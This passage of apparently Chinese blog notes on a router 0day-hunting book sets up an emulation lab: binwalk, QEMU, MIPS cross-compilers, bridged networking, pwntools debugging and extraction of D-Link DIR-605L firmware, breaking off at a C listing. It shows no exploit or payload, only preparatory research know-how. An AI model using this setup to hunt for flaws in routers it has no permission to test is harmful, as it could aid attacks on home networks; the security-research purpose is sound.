          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《揭秘家用路由器0day漏洞挖掘技术》读书笔记</title>
      <link href="/note-book-Router0day/"/>
      <url>/note-book-Router0day/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="《揭秘家用路由器0day漏洞挖掘技术》"><a href="#《揭秘家用路由器0day漏洞挖掘技术》" class="headerlink" title="《揭秘家用路由器0day漏洞挖掘技术》"></a>《揭秘家用路由器0day漏洞挖掘技术》</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VMWare  + Ubuntu18.04 + Python3</span><br><span class="line">WSL + Ubuntu18.04 + Python3</span><br></pre></td></tr></table></figure><h3 id="安装binwalk"><a href="#安装binwalk" class="headerlink" title="安装binwalk"></a>安装binwalk</h3><p>参考: <a href="https://www.howtoinstall.me/ubuntu/18-04/binwalk/">How to Install binwalk in Ubuntu 18.04</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install binwalk</span><br></pre></td></tr></table></figure><h3 id="安装QEMU"><a href="#安装QEMU" class="headerlink" title="安装QEMU"></a>安装QEMU</h3><p>参考: <a href="https://www.howtoinstall.me/ubuntu/18-04/qemu/">How to Install qemu in Ubuntu 18.04</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu</span><br><span class="line">sudo apt install qemu-user-static</span><br><span class="line">sudo apt install qemu-system</span><br></pre></td></tr></table></figure><h3 id="安装binfmt"><a href="#安装binfmt" class="headerlink" title="安装binfmt"></a>安装binfmt</h3><p><a href="https://zh.wikipedia.org/wiki/Binfmt_misc">binfmt_misc - 维基百科，自由的百科全书 (wikipedia.org)</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install binfmt-support</span><br></pre></td></tr></table></figure><h3 id="安装GCC"><a href="#安装GCC" class="headerlink" title="安装GCC"></a>安装GCC</h3><p>参考:</p><ul><li><p><a href="https://linuxize.com/post/how-to-install-gcc-compiler-on-ubuntu-18-04/">How to Install GCC Compiler on Ubuntu 18.04 | Linuxize</a></p></li><li><p><a href="https://stackoverflow.com/questions/22355436/how-to-compile-32-bit-apps-on-64-bit-ubuntu">64 bit - How to Compile 32-bit Apps on 64-bit Ubuntu? - Stack Overflow</a></p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install build-essential</span><br><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT cat hello.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">printf(&quot;Hello World!\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">➜  IOT gcc -m32 hello.c -o hello32 </span><br><span class="line">➜  IOT ./hello32</span><br><span class="line">Hello World!</span><br><span class="line">➜  IOT file hello32</span><br><span class="line">hello32: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=421a37f67f8e04c1c0fc5524e7741a8c44e95f1d, not stripped</span><br><span class="line">➜  IOT gcc hello.c -o hello</span><br><span class="line">➜  IOT ./hello</span><br><span class="line">Hello World!</span><br><span class="line">➜  IOT file hello</span><br><span class="line">hello: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1234f2d2c59244aae4b4a8cc4015da1ee68ba2dd, not stripped</span><br></pre></td></tr></table></figure><h3 id="安装MIPS交叉编译"><a href="#安装MIPS交叉编译" class="headerlink" title="安装MIPS交叉编译"></a>安装MIPS交叉编译</h3><p>书中使用<code>Buildroot</code>搭建交叉编译环境，安装太久，且每一次只能搭建一种交叉编译环境，故换为<code>mipsel-gcc</code>和<code>mips-gcc</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y gcc-mips-linux-gnu</span><br><span class="line">sudo apt-get install -y gcc-mipsel-linux-gnu</span><br></pre></td></tr></table></figure><p>大端使用<code>mips-linux-gnu-gcc</code>命令， 小端使用<code>mipsel-linux-gnu-gcc</code>命令</p><ul><li>用<code>mips-linux-gnu-gcc -EL</code>会报错, 不知道为什么</li></ul><h4 id="测试QEMU与编译环境"><a href="#测试QEMU与编译环境" class="headerlink" title="测试QEMU与编译环境"></a>测试QEMU与编译环境</h4><h5 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT mipsel-linux-gnu-gcc -EL hello.c -o hello_mips_lsb</span><br><span class="line">➜  IOT file hello_mips_lsb </span><br><span class="line">hello_mips_lsb: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, for GNU/Linux 3.2.0, BuildID[sha1]=0866c0f15f5d01e4550ef3d2416f252a290871fe, not stripped</span><br></pre></td></tr></table></figure><h5 id="大端序"><a href="#大端序" class="headerlink" title="大端序"></a>大端序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT mips-linux-gnu-gcc hello.c -o hello_mips_msb </span><br><span class="line">➜  IOT file hello_mips_msb </span><br><span class="line">hello_mips_msb: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, for GNU/Linux 3.2.0, BuildID[sha1]=86fcd8cb4a3f010b8244c6742eedd8a6576cd82c, not stripped</span><br></pre></td></tr></table></figure><h5 id="静态链接运行"><a href="#静态链接运行" class="headerlink" title="静态链接运行"></a>静态链接运行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT mips-linux-gnu-gcc -static hello.c -o hello_mips</span><br><span class="line">➜  IOT qemu-mips hello_mips                            </span><br><span class="line">Hello World!</span><br><span class="line">➜  IOT file hello_mips </span><br><span class="line">hello_mips: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=f03bfc54584f5afbfe7925377bde2c7124e73dd2, not stripped</span><br></pre></td></tr></table></figure><h5 id="动态链接运行"><a href="#动态链接运行" class="headerlink" title="动态链接运行"></a>动态链接运行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT mips-linux-gnu-gcc hello.c -o hello_mips</span><br><span class="line">➜  IOT file hello_mips</span><br><span class="line">hello_mips: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, for GNU/Linux 3.2.0, BuildID[sha1]=999a8168ec52981d21b4b8029ab51521aa6179cc, not stripped</span><br><span class="line">➜  IOT qemu-mips hello_mips</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br></pre></td></tr></table></figure><h6 id="解决方法1"><a href="#解决方法1" class="headerlink" title="解决方法1"></a>解决方法1</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT sudo mkdir /etc/qemu-binfmt</span><br><span class="line">➜  IOT sudo ln -s /usr/mips-linux-gnu /etc/qemu-binfmt/mips</span><br><span class="line">➜  IOT sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mips</span><br></pre></td></tr></table></figure><h6 id="解决方法2"><a href="#解决方法2" class="headerlink" title="解决方法2"></a>解决方法2</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT qemu-mips -L &quot;/usr/mips-linux-gnu&quot; hello_mips</span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><h6 id="解决方法3"><a href="#解决方法3" class="headerlink" title="解决方法3"></a>解决方法3</h6><p>参考:<a href="https://www.giantbranch.cn/2018/04/16/%E4%B8%80%E6%AC%A1qemu%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E8%B7%AF%E7%94%B1%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%AE%B0%E5%BD%95/">一次qemu动态调试路由程序的记录 | giantbranch’s blog</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT cp $(which qemu-mips) ./            </span><br><span class="line">➜  IOT sudo chroot . ./qemu-mips hello_mips</span><br><span class="line">chroot: failed to run command ‘./qemu-mips’: No such file or directory</span><br></pre></td></tr></table></figure><p>需要将依赖库复制到对应目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT ldd qemu-mips </span><br><span class="line">linux-vdso.so.1 (0x00007fffed993000)</span><br><span class="line">libgmodule-2.0.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0 (0x00007fc2abf24000)</span><br><span class="line">libglib-2.0.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0 (0x00007fc2abc0d000)</span><br><span class="line">librt.so.1 =&gt; /lib/x86_64-linux-gnu/librt.so.1 (0x00007fc2aba05000)</span><br><span class="line">libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007fc2ab667000)</span><br><span class="line">libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007fc2ab44f000)</span><br><span class="line">libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fc2ab230000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc2aae3f000)</span><br><span class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fc2aac3b000)</span><br><span class="line">libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fc2aa9c9000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007fc2ae58a000)</span><br></pre></td></tr></table></figure><p>复制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir usr</span><br><span class="line">mkdir usr/lib</span><br><span class="line">mkdir lib</span><br><span class="line">mkdir lib/x86_64-linux-gnu</span><br><span class="line">mkdir lib64</span><br><span class="line">cp /usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0  ./usr/lib/</span><br><span class="line">cp /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/librt.so.1  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libm.so.6  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libgcc_s.so.1  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libpthread.so.0  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libc.so.6  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libdl.so.2  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libpcre.so.3  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib64/ld-linux-x86-64.so.2  ./lib64</span><br></pre></td></tr></table></figure><p>继续运行报错</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT sudo chroot ./ ./qemu-mips hello_mips</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br></pre></td></tr></table></figure><p>继续复制到本地对应目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /usr/mips-linux-gnu/lib/ld.so.1 ./lib</span><br><span class="line">cp /usr/mips-linux-gnu/lib/libc.so.6 ./lib</span><br></pre></td></tr></table></figure><p>成功运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT sudo chroot ./ ./qemu-mips hello_mips     </span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><ul><li><code>chroot</code>命令将<code>qemu-mips</code>执行的根目录到当前目录</li></ul><h3 id="MIPS系统网络的配置"><a href="#MIPS系统网络的配置" class="headerlink" title="MIPS系统网络的配置"></a>MIPS系统网络的配置</h3><p>参考: <a href="http://ronpa.top/2018/11/30/qemu%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85/">qemu配置安装 | Ronpa的博客</a></p><p>使用QMU模拟正在运行的MIPS系统, 并配置MIPS系统网络</p><h4 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br></pre></td></tr></table></figure><h4 id="修改-ubuntu主机网络配置"><a href="#修改-ubuntu主机网络配置" class="headerlink" title="修改 ubuntu主机网络配置"></a>修改 ubuntu主机网络配置</h4><p>修改 ubuntu主机网络配置文件<code>/etc/network/interfaces</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>修改为如下内容并保存、关闭</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ubuntu 16.04开始用ens33代替eth0</span></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"> </span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_stp off</span><br><span class="line">bridge_maxwait 1</span><br></pre></td></tr></table></figure><ul><li>需要注意的是在ubuntu16.04开始, 原来的 eth0 被重命名为了 ens33。当然了还有一种方法解决这个问题, 将 ens33 修改为原来的 eth0，修改的方法可以参考文档：<a href="https://www.itzgeek.com/how-tos/mini-howtos/change-default-network-name-ens33-to-old-eth0-on-ubuntu-16-04.html">Change default network name (ens33) to old “eth0” on Ubuntu 18.04 / Ubuntu 16.04 (itzgeek.com)</a></li><li>由于使用的是Ubuntu18.04， 故用原书的配置文件会出现网络重启失败，不知原因</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT dmesg |grep eth</span><br><span class="line">[    4.626349] e1000 0000:02:01.0 eth0: (PCI:66MHz:32-bit) 00:0c:29:fe:c6:47</span><br><span class="line">[    4.626364] e1000 0000:02:01.0 eth0: Intel(R) PRO/1000 Network Connection</span><br><span class="line">[    4.627896] e1000 0000:02:01.0 ens33: renamed from eth0</span><br></pre></td></tr></table></figure><h4 id="创建QEMU的网络接口启动脚本"><a href="#创建QEMU的网络接口启动脚本" class="headerlink" title="创建QEMU的网络接口启动脚本"></a>创建QEMU的网络接口启动脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/qemu-ifup</span><br></pre></td></tr></table></figure><p>在脚本文件<code>/etc/qemu-ifup</code>中写入如下的内容：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure><ul><li><code>/etc/qemu-ifup</code>文件存在, 为了防止不干扰 <code>/etc/qemu-ifup</code>文件的原来的命令操作 没有修改和删除 <code>/etc/qemu-ifup</code>文件中的原文件内容而是在后面直接添加自己的命令操作的内容</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211014161236714.png" alt="image-20211014161236714"></p><p>保存文件<code>/etc/qemu-ifup</code> 以后，赋予文件<code>/etc/qemu-ifup</code> 可执行权限，然后重启网络使所有的配置生效。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启网络使配置生效</span></span><br><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT sudo chmod a+x /etc/qemu-ifup</span><br><span class="line">➜  IOT sudo /etc/init.d/networking restart</span><br><span class="line">[ ok ] Restarting networking (via systemctl): networking.service.</span><br></pre></td></tr></table></figure><h4 id="QEMU启动配置"><a href="#QEMU启动配置" class="headerlink" title="QEMU启动配置"></a>QEMU启动配置</h4><p>启用桥接网络</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT sudo ifdown ens33</span><br><span class="line">➜  IOT sudo ifup br0</span><br><span class="line">ifup: interface br0 already configure</span><br></pre></td></tr></table></figure><p>下载MIPS虚拟机，<a href="https://people.debian.org/~aurel32/qemu/mips/">Index of /~aurel32/qemu/mips (debian.org)</a></p><p>这里选择下载MIPS32小端格式 的虚拟机镜像文件，下载的内核文件为 <code>vmlinux-2.6.32-5-4kc-malta</code> 磁盘镜像文件为 <code>debian_squeeze_mipsel_standard.qcow2</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211014162127341.png" alt="image-20211014162127341"></p><p>下方说明了对应的位数的文件及其启动方式</p><p><img src="Note.assets/image-20211027191307418.png" alt="image-20211027191307418"></p><p>启动<code>qemu</code>运行镜像</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211014163544649.png" alt="image-20211014163544649" style="zoom: 67%;" /><p>或</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap -nographic</span><br></pre></td></tr></table></figure><ul><li><code> -nographic</code> 会直接在当前终端启动，而不是另起终端</li></ul><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211014163703017.png" alt="image-20211014163703017" style="zoom:67%;" /><p>根据提示<code>root</code>的密码都为<code>root</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Both images are 25GiB images in QCOW2 format on which a Debian Squeeze or</span><br><span class="line">Wheezy &quot;Standard system&quot; installation has been performed. The other</span><br><span class="line">installation options are the following:</span><br><span class="line">  - Keyboard:       US</span><br><span class="line">  - Locale:         en_US</span><br><span class="line">  - Mirror:         ftp.debian.org</span><br><span class="line">  - Hostname:       debian-mips</span><br><span class="line">  - Root password:  root</span><br><span class="line">  - User account:   user</span><br><span class="line">  - User password:  user</span><br></pre></td></tr></table></figure><h4 id="配置MIPS系统网络"><a href="#配置MIPS系统网络" class="headerlink" title="配置MIPS系统网络"></a>配置MIPS系统网络</h4><p><code>ifconfig -a</code>发现网络接口没有分配到IP地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# ping www.baidu.com</span><br><span class="line">ping: unknown host www.baidu.com</span><br><span class="line">root@debian-mips:~# ifconfig -a</span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:8 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:560 (560.0 B)  TX bytes:560 (560.0 B)</span><br></pre></td></tr></table></figure><p>修改<code>/etc/network/interfaces</code>中的<code>eth0</code>改为<code>eth1</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# nano /etc/network/interfaces</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> This file describes the network interfaces available on your system</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and how to activate them. For more information, see interfaces(5).</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The loopback network interface</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The primary network interface</span></span><br><span class="line">allow-hotplug eth1   # 1</span><br><span class="line">iface eth1 inet dhcp # 2 这两行中的eth0中改为eth1</span><br></pre></td></tr></table></figure><p>将<code>eth1</code>启起来</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifup eth1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# ifconfig</span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01  </span><br><span class="line">          inet addr:192.168.126.131  Bcast:192.168.126.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::216:3eff:fe00:1/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:10 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:1543 (1.5 KiB)  TX bytes:1468 (1.4 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:8 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:560 (560.0 B)  TX bytes:560 (560.0 B)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# ping www.baidu.com -c4</span><br><span class="line">PING www.a.shifen.com (163.177.151.110) 56(84) bytes of data.</span><br><span class="line">64 bytes from 163.177.151.110: icmp_req=1 ttl=128 time=10.3 ms</span><br><span class="line">64 bytes from 163.177.151.110: icmp_req=2 ttl=128 time=8.64 ms</span><br><span class="line">64 bytes from 163.177.151.110: icmp_req=3 ttl=128 time=16.7 ms</span><br><span class="line">64 bytes from 163.177.151.110: icmp_req=4 ttl=128 time=8.70 ms</span><br><span class="line"></span><br><span class="line">--- www.a.shifen.com ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 6067ms</span><br><span class="line">rtt min/avg/max/mdev = 8.643/11.130/16.774/3.335 ms</span><br></pre></td></tr></table></figure><h3 id="Pwntools相关"><a href="#Pwntools相关" class="headerlink" title="Pwntools相关"></a>Pwntools相关</h3><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process([<span class="string">&#x27;qemu-mips&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mips-linux-gnu&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>])</span><br></pre></td></tr></table></figure><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><blockquote><p>这里需要注意的是插件可能会导致 gdbserver crash, 所以用gdb-mularch远程调试没法用插件…..</p></blockquote><p>启用多架构调试需要安装<code>gdb-multiarch</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure><p>使用主要参考: <a href="https://docs.pwntools.com/en/stable/qemu.html">pwnlib.qemu — QEMU Utilities — pwntools 4.6.0 documentation</a></p><p>首先是环境的搭建: </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir /etc/qemu-binfmt</span><br><span class="line">sudo ln -s /usr/mips-linux-gnu /etc/qemu-binfmt/mips</span><br><span class="line">sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel</span><br></pre></td></tr></table></figure><p><code>/etc/qemu-binfmt</code>是<code>pwntools</code>中启动qmeu找lib的路径</p><p>大端: </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pwnlib.qemu.user_path(arch = <span class="string">&quot;mips&quot;</span>)</span><br><span class="line"><span class="string">&#x27;qemu-mips-static&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pwnlib.qemu.ld_prefix(arch = <span class="string">&quot;mips&quot;</span>)</span><br><span class="line"><span class="string">&#x27;/etc/qemu-binfmt/mips&#x27;</span></span><br></pre></td></tr></table></figure><p>小端:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pwnlib.qemu.user_path(arch = <span class="string">&quot;mips&quot;</span>)</span><br><span class="line"><span class="string">&#x27;qemu-mipsel-static&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pwnlib.qemu.ld_prefix(arch = <span class="string">&quot;mips&quot;</span>)</span><br><span class="line"><span class="string">&#x27;/etc/qemu-binfmt/mipsel&#x27;</span></span><br></pre></td></tr></table></figure><p>其中</p><ul><li><code>context.arch</code> : 设置指令集架构</li><li><code>context.endian</code> : 设置大小端，默认小端序</li><li><code>pwnlib.qemu.ld_prefix()</code>: 返回当前选择体系结构的链接路径</li><li><code>pwnlib.qemu.user_path()</code>: 返回当前选择体系结构的qemu-user二进制文件的路径</li></ul><p>然后这样去启动<code>gdb</code>调试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = gdb.debug(<span class="string">&quot;./mips_overflow&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="修复路由器程序运行环境"><a href="#修复路由器程序运行环境" class="headerlink" title="修复路由器程序运行环境"></a>修复路由器程序运行环境</h2><p>D-Link固件下载 <a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_REVA_FIRMWARE_1.13_WW.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_REVA_FIRMWARE_1.13_WW.ZIP</a></p><p>提取固件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -e </span><br></pre></td></tr></table></figure><p>搜索<code>boa</code>程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find ./ -name boa</span><br><span class="line">cp ./bin/boa .</span><br></pre></td></tr></table></figure><p>动态调试固件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./qemu-mips -g 1234 ./bin/boa</span><br></pre></td></tr></table></figure><p><strong>ampib.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span 